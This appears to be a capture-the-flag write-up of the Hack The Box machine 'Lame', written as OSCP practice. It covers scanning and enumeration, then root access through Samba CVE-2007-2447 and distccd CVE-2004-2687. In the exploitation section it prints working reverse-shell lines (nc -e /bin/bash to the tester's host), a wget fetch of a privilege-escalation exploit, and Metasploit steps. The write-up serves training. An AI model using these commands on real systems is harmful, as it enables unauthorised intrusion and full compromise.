Lame

 -------------------------------------
# Overview

The machine I'm going to attempt to exploit is a linux machine called "Lame". This is one of the OSCP like boxes that have been listed by @TJ_Null on Twitter. Since I'm preparing for my OSCP I'm going to exploit this box without metasploit. At the end of the write up I will have a section on exploiting it with metasploit.

# Reconnaissance 

For this machine we are given the IP addess 10.10.10.3. I'm going to start by running a few nmap scan to get some more information about the target and see if I can find some potential entry point

### ****Scanning****

- **Nmap Scan**
	- Command 
	`sudo nmap -sC -sV -T4 -O -v -oA lame 10.10.10.3`
		- `-sC`: run default nmap scripts
		- `-T4`: Set timing template (higher is faster)
		- `-O`: Detect OS
		- `sV`: detect service version
		- `-v`: Verbose
		- `-oA`: Output all files formats to name "lame"
	

Running the initial nmap scan showed 4 open ports on the target machine

- **Port 21**: Running File Transfer Protocol (FTP). The specific version is vsFTPd 2.3.4. Also noted that anonymous login is allowed.
- **Port 22**: Running SSH. The specific version is OpenSSH version 4.7p1.
- **Port 139 and 445**: Running Samba smbd 3.X - 4.X. Didn't get a specific version.

Before I start diving deeper into these ports, I'm going to run another scan to check for all ports just to ensure that I'm not missing any other services.

- **Deep Scan**
	- Command
	`nmap -sC -sV -p- -T4 -O -oA lame_deep 10.10.10.3`
	
Here are the results of the scan



![Screenshot from 2021-04-19 10-03-20.png](../_resources/f3a83f8998c74af6b431459037cf34df.png)

There is a new port that didn't show up in the initial nmap scan. This is due to port 3632 not being a common port.

- **Port 3632**: Running distccd v1 4.2.4. A service that I am not familiar with.

Now to be thorough I'm going to run a a UDP scan to see if anything is open.

- **UDP Scan**
	- Command
	`nmap -sU -p- -T4 -O -oA lame_UDP 10.10.10.3`
	
The scan resulted in all ports being closed.



![Screenshot from 2021-04-20 11-30-46.png](../_resources/ba195c3b1ed04317a1bb132addef3a0a.png)

In conclusion, we have four potential entry points into this machine.

--------------------------------------------
--------------------------------------------
# Enumeration

Now let's dive deeper into these services and see if we can find any vulnerabilities or misconfigurations

## **Port 21 vsFTPd 2.3.4**

Now let use the best "hacking" tool that exists... Google. Google shows us that it is in fact a vulnerable verison and is vulnerable to remote code excution. 

- ***Vulnerabily Explanation***
To exploit this vulnerability we need to trigger the malicious function `vsf_sysutil_extra();` function by sending a sequence of specific bytes. If the execution is successful it should open a backdoor on port 6200 of the vulnerable system.

- ***nmap script scan***
To verify that it is vulnerable to this attack lets use an nmap script 





![Screenshot from 2021-04-20 12-08-27.png](../_resources/09af72eaf241473f8081ddc2f875b381.png)

After running the script, the ouput shows up that this is not vulnerable to the exploit.



![Screenshot from 2021-04-22 09-15-56.png](../_resources/27b663fa4c1b472fb4265e1c1737aebf.png)

## **Port 22 OpenSSH v4.7p1**

Taking a quick look at Google didn't list any notable results results. 

Looking at the nmap scripts we have a few options. We could potentially bruteforce SSH. However, we could get locked out or it could take a long time and list no results. I'll keep this as a last resort 



![Screenshot from 2021-04-22 09-29-27.png](../_resources/9485fba7f58740db895fddfb5c790604.png)

## **Port 139 and 445 Samba smbd 3.X - 4.X**

This is the only service that we didn't get a specific version for. However, these ports are commonly misconfigured and/or vulnerable. Lets take a look.

We know that it's running an SMB server, I'll use SMB client to get the specific version.

- **SMB Client Fix**
	- I was getiing the error below while trying to connect to the server using `smbclient`
![Screenshot from 2021-04-22 09-51-18.png](../_resources/571a7228aeca40d4a513a55378c3e295.png)
	- Running a quick Google search I was able to find a solution. I had to add the line `client min protocol = NT1` to the `etc/samba/smb.conf` file under the global section (see screenshot below)
![Screenshot from 2021-04-22 09-55-38.png](../_resources/40805190e3fa452e8d6e25072af43f2d.png)


Now that we have `smbclient` running again let's try connecting.

`smbclient -L 10.10.10.3`

- `-L`: lists what services are available on a server

We succesfully connected and now have a specific version: **Samba 3.0.20-Debian**

![Screenshot from 2021-04-22 10-10-18.png](../_resources/21c0cc4c436f4081a198ddbdfda778c3.png)


Now before we go any further let's see what permissions we have on the share drives.

`sudo ./smbmap.py -H 10.10.10.3 `


- `-H`: IP of the host


![Screenshot from 2021-04-22 10-24-17.png](../_resources/a9477331c2de4c8099f32a90cf70fce0.png)

As you can see we have READ and WRITE access to the tmp folder.

Now that we have the smb version, let search for it on Google. I found a ton of vulnerabilitie and we could esially expoit this with metasploit. However, I would like to exploit this without using metasploit as I'm preparing for the OSCP. Don't worry though I will show the metasploit exploitation as well.

I found CVE-2007–2447 which I  can exploit without using metasploit and get root access. By looking at the metasploit script we can see the paylad is actually very simple. All we need to do is replace the *payload.encoded" with out payload.

``username = "/=`nohup " + payload.encoded + "`"``

The payload exploits the username field as the fild allowed you to enter metacharacters so that we can inject our payload. Before exploiting this lets check the last service.


*note: had to download smbmap directly from github as the lastest debian package was not working* 

## **Port 3632 distccd v1 4.2.4**

Running a quick Google search on this version shows us that it is vulnerable. There is even and nmap scipt for it, so let's run that.

`nmap -p 3632 --script distcc-cve2004-2687 10.10.10.3`

Looking at the results of the scan show us that it is vulnerable.


![Screenshot from 2021-04-26 14-03-03.png](../_resources/6b9914a8414d45f0b1d1e890b44ada4c.png)

We're going to try and exploit both vulnerabilities that we found

----------------------------------------------------------------------------------------------------------------

# Exploitation 


## Samba

Lets open up a listener on our host machine.

`nc -lvnp 4444`

Now I'm going to login to the smb client

`smbclient //10.10.10.3/tmp`


![Screenshot from 2021-04-26 14-09-48.png](../_resources/44471f33bacb457a828536fbf9da5e44.png)

Now let run our exploit.

``logon "/=`nohup nc -nv 10.10.14.14 4444 -e /bin/bash`"``

Perfect we got our reverse shell and we're root, No priviledge escalation needed.


![Screenshot from 2021-04-26 14-11-18.png](../_resources/a77ee9b05e7041fdbfaca002b714cd78.png)


## distccd v1 4.2.4

Now let try our potential second point of entry. We can use the nmap script to exploit this vulnerbaility as well, since we know that it is vulnerable to CVE 2004–2687.

Lets set up our listener

`nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.14 4444 -e /bin/bash'"`

We got our reverse shell, however we are not root so we will need to do some priviledge escalation.



![Screenshot from 2021-04-27 09-29-34.png](../_resources/d85fdbcfb98e42fc861b65f2247af838.png)

Let find our linux version out. 



![Screenshot from 2021-04-27 09-33-34.png](../_resources/2619fb79bd3d4d868fe61150134720fe.png)

I tried a few priviledge escalations from exploitdb with no luck. After digging around Google for a bit I was able to find an priviledge escalation that might work.

First step is to set up a server

`python -m SimpleHTTPServer 8090`

Now on the target machine i'll download the exploit from exploitdb

`wget http://10.10.14.14:8090/8572.c`

Since it's a C file we need to compile it using gcc.

`gcc 8572.c -o 8572`

Let look at the usage before we execute the file.


![Screenshot from 2021-04-30 22-55-55.png](../_resources/507b385b0e5b4fb8b0722120df5d2b2a.png)

There's ac ouple things that we will need to do to get this to work.

- find the PID id the udevd netlink
- Put a paylod in the /tmp forder and it will run as root.

Let's find the PID of the udevd using the command below:

`ps -aux | grep devd`

Here we find our PID.

![Screenshot from 2021-04-30 23-27-20.png](../_resources/c4f2dad4b5d44fbd8f44835bf36da36d.png)

Now lets create a quick srcipt that will give us a reverse shell when it's ran in the /tmp folder.


![Screenshot from 2021-04-30 23-40-54.png](../_resources/fc7022d85fb84bd9bf44cee04d5af25a.png)


Now let open up a listener on our machine.

After running this eploit several times with different payloads I was not able to get the reverse shell. For some reason the exploit was not running my run file at all. Looked up some solutions after trying for a while and was still not able to get the priviledge escalation. Could be the machine acting up. will try again in the future.

*Update: After reseting the machine I was able to get the root





-----------------------------------------------
## Metasploit Exploitation


After stating up metasploit I searched for samba vulnerabilities. A few results were listed as you can see below 


![Screenshot from 2021-04-17 13-46-36.png](../_resources/bbd58b3fdcd74b79875ee6ef9783a011.png)

I decided to use the exploit listed below first as it is listed as excelent

`exploit/multi/samba/usermap_script`

	

- **Metasploit**
	1. `use 4`
	2. `show OPTIONS`
	
	![Screenshot from 2021-04-17 13-52-33.png](../_resources/c640a8652a094e688c9ec1370f2020d4.png)
	
	3. `set RHOST 10.10.10.3`
	4. `set LHOST tun0` (OVPN Interface)
	5. `exploit`

Now we have the reverse shell using the `cmd/unix/reverse_netcat` payload.



![Screenshot from 2021-04-17 14-30-52.png](../_resources/df755de6edfa43cb82154390c15df0c1.png)

--------------------------------------------------------

## Getting the Flag

- User Flag
	- `cd /`
	- `cd home`
	- `cd makis`
	- `cat user.txt`


![Screenshot from 2021-04-17 14-39-18.png](../_resources/28a1d62d57e24676a7c04a218eed2640.png)



- Root Flag
	- `cd /`
	- `cd root`
	- `cat root.txt`


![Screenshot from 2021-04-17 14-35-33.png](../_resources/7e1a49c811494c3db756645df8a4e12a.png)



